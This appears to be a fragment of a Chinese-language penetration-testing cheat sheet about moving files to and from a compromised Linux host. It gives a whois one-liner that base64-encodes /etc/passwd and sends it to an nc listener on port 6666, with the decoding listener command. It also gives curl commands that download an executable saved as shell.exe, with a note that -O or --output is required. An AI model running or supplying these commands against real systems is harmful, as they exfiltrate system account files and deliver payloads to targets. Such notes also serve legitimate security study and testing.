#### Linux whois

*   
*   

```
whois -h 127.0.0.1 -p 6666 `cat /etc/passwd | base64`nc -lvvp 6666 | sed "s/ //g" | base64 -d
```

#### wget

#### curl

直接输入`curl http://ip/xx.exe`是无法将目标下载到目标机器上的，必须加参数`-O`或者`--output`

*   
*   
*   

```
curl http://127.0.0.1:6666/1.exe -O shell.exe 或者 curl http://127.0.0.1:6666/1.exe --output shell.exe
```
